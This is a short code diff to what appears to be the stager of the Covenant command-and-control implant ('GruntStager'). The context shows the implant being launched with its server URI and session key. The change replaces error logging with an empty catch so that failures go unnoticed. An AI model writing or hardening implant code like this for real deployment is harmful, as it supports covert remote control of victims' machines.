@@ -207,7 +207,7 @@ namespace GruntStager
                     gruntAssembly.GetTypes()[0].GetMethods()[0].Invoke(null, new Object[] { CovenantURI, CovenantCertHash, GUID, SessionKey });
                 }
             }
-            catch (Exception e) { Console.Error.WriteLine(e.Message + Environment.NewLine + e.StackTrace); }
+            catch { }
         }
 
         public class CookieWebClient : WebClient
